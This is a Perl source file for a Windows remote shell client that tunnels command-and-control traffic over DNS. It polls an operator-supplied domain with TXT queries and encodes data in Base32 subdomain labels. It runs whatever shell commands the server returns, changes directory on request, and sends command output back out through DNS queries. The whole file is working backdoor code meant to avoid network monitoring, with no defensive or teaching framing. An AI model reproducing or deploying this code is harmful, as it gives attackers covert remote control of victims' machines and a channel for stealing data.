###############################
# To Do
# * Use local dns server config
# * Support multiple encoding
###############################
use warnings;
use strict;
use Net::DNS;
use MIME::Base32 qw( RFC );
use IO::CaptureOutput qw(capture qxx);

###############################
# Global Variables
###############################
my $domain;
my $debug;
my $client_id = int(rand(65535));
my @nameservers;
#my $client_id = 100;

###############################
# Parse User Args
###############################
foreach (@ARGV) {
	if ($_ eq "-d") {
		$debug = 1;
	}elsif ($_ =~ /--domain=(.*)/) {
		$domain = $1;
	}
}

if ($debug) {
	print "DEBUG: $debug\n";
	print "DOMAIN: $domain\n";
}

###############################
# Subroutines
###############################
sub getNameServers {
	use Win32::Registry;
	#my $dns_via_dhcp;
	$::HKEY_LOCAL_MACHINE->Open("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", my $key) or debug("READ DHCP DNS ERROR", $!);
	my ($type, $value);
    $key->QueryValueEx("DHCPNameServer", $type, $value);
	debug("DHCP DNS SERVERS", $value);
	my @serverList = split(/\s/, $value);
	foreach(@serverList) {
		push(@nameservers, $_);
	}
    $key->QueryValueEx("NameServer", $type, $value);
	debug("Static DNS SERVERS", $value);	
	@serverList = split(/\s/, $value);
		foreach(@serverList) {
		push(@nameservers, $_);
	}
	$key->Close();
}

sub roundup {
	my $n = shift;
	return(($n == int($n)) ? $n : int($n+1));
}

sub debug {
	if ($debug) {
		print "$_[0] => $_[1]\n";
	}
}

sub parse {
	return MIME::Base32::decode($_[0]);
}

sub sendQuery{
	my $msg = $_[0];
	my $cmd = $_[1];
	if (length($msg) == 0) {
		$msg = "NULL";
	}	
	my $msg_encoded = MIME::Base32::encode($msg);

	my $client_id_encoded = MIME::Base32::encode($client_id);
	debug("CLIENT_ID_ENCODED", "$client_id_encoded($client_id)");
	debug("MSG_ENCODED LENGTH", length($msg_encoded));	
	
	my $parts = roundup(length($msg_encoded) / 63);
	debug("NUM OF PARTS", $parts);
	
	my @chunks = ($msg_encoded =~ /.{1,63}/gs);
	my $return;
	for (my $part = 1; $part <= $parts; $part++) {
		debug("PART: $part", "$chunks[$part-1] (" . length($chunks[$part-1]) . ")");
	
		my $query = "$chunks[$part-1].$part.$parts.$cmd.$client_id_encoded.$domain";
		if ($debug) {
			print "QUERY: $query (" . length($query) . ")\n";
		}
		my $nameserverref = \@nameservers;
		my $res = Net::DNS::Resolver->new(        
			nameservers => \@nameservers,	
			timeout => 120,
			recurse => 1,
			#debug   => 1,
		);
		my $answer = $res->query($query, 'TXT');
		if($answer) {
			foreach my $rr ($answer->answer) {
				next unless $rr->type eq "TXT";
				debug("RESPONSE_ENCODED:", $rr->txtdata);
				$return = $rr->txtdata;
			}
		}
	}
	return $return;
}

sub shell{
		my $exec_rsp = "NULL";
		my $client_cmd = "NULL";
		my $sleep_value = 60;
        while(1) {
				getNameServers();
				debug("EXEC_RSP", $exec_rsp);
				debug("CLIENT_CMD", $client_cmd);
				my $response = sendQuery($exec_rsp, $client_cmd);
				my @args = split(/\./, $response);
				my $cmd = $args[0];
				debug("SERVER_CMD", $cmd);
				my $payload = MIME::Base32::decode($args[1]);
				debug("SERVER_PAYLOAD", $payload);
				if ($cmd eq "UPLOAD") {
					debug("CMD", $cmd);
				} elsif ($cmd eq "DOWNLOAD") {
					debug("CMD", $cmd);
				} elsif ($cmd eq "SLEEP") {
					debug("CMD", $cmd);
					$sleep_value = $payload;
					$exec_rsp = "Sleep set to $payload\n";
					$client_cmd = "SLEEP";
				} elsif ($cmd eq "EXEC") {
					debug("CMD", $cmd);
				} elsif ($cmd eq "CMD" ) {
					if ($payload ne "NULL") {
						my ($stdout, $stderr, $success, $exit_code) = IO::CaptureOutput::capture_exec($payload);
						if($stdout) {
							$exec_rsp = $stdout;
						} elsif ($stderr) {
							$exec_rsp = $stderr;
						} elsif($exit_code) {
							$exec_rsp = "COMMAND EXITED WITH: FAILURE\n"
						} elsif($exit_code == 0) {
							$exec_rsp = "COMMAND EXITED WITH: SUCCESS\n";
						}
						$client_cmd = "CMD";
					}
				} elsif($cmd eq "CWD") {
					if(chdir $payload) {
						$exec_rsp = "COMMAND EXITED WITH: SUCCESS\n";
					} else {
						$exec_rsp = "COMMAND EXITED WITH: FAILURE\n";
					}
					$client_cmd = "CWD";
				} elsif ($cmd eq "NULL") {
					# debug("CMD", $cmd);
					$exec_rsp = "NULL";
					$client_cmd = "NULL";
				} else {
					debug("INVALID CMD", $cmd);
				}
				debug("LINE SEPERATOR", "======================================");
				sleep $sleep_value;
        }
}
###############################
# Main
###############################
shell();
